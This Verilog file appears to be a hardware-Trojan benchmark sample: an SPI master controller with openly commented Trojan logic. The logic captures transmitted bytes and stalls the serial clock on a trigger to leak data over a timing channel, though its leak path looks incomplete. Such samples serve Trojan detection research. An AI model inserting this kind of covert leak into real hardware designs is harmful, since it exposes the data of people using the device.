// SPI-T100: SPI controller with data exfiltration Trojan

module spi_master_trojan(
    input clk,
    input rst,
    input [7:0] data_in,
    input start,
    input cpol,
    input cpha,
    output reg sclk,
    output reg mosi,
    input miso,
    output reg ss_n,
    output reg [7:0] data_out,
    output reg done
);

    reg [2:0] bit_cnt;
    reg [7:0] tx_shift;
    reg [7:0] rx_shift;
    reg [7:0] clk_cnt;
    reg active;

    // Trojan: leak data on covert timing channel
    reg [7:0] Trojan_leak_buffer;
    reg [15:0] leak_counter;
    wire ht_active = (leak_counter[15:8] == data_in);

    parameter CLK_DIV = 8'd10;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            sclk <= cpol;
            mosi <= 1'b0;
            ss_n <= 1'b1;
            data_out <= 8'b0;
            done <= 1'b0;
            bit_cnt <= 3'b0;
            tx_shift <= 8'b0;
            rx_shift <= 8'b0;
            clk_cnt <= 8'b0;
            active <= 1'b0;
            Trojan_leak_buffer <= 8'b0;
            leak_counter <= 16'b0;
        end else begin
            done <= 1'b0;

            if (start && !active) begin
                active <= 1'b1;
                ss_n <= 1'b0;
                tx_shift <= data_in;
                bit_cnt <= 3'd7;
                clk_cnt <= 8'b0;
                sclk <= cpol;

                // Trojan: capture data
                Trojan_leak_buffer <= data_in;
                leak_counter <= leak_counter + 1;
            end else if (active) begin
                clk_cnt <= clk_cnt + 1;

                if (clk_cnt == CLK_DIV) begin
                    clk_cnt <= 8'b0;
                    sclk <= ~sclk;

                    if (sclk == cpol) begin
                        mosi <= tx_shift[7];
                        tx_shift <= {tx_shift[6:0], 1'b0};
                    end else begin
                        rx_shift <= {rx_shift[6:0], miso};

                        if (bit_cnt == 0) begin
                            active <= 1'b0;
                            ss_n <= 1'b1;
                            data_out <= rx_shift;
                            done <= 1'b1;
                            sclk <= cpol;
                        end else begin
                            bit_cnt <= bit_cnt - 1;
                        end
                    end
                end

                // Trojan: timing-based leak
                if (ht_active) begin
                    // Slightly delay SCLK edge
                    clk_cnt <= clk_cnt;  // Stall one cycle
                end
            end
        end
    end

endmodule
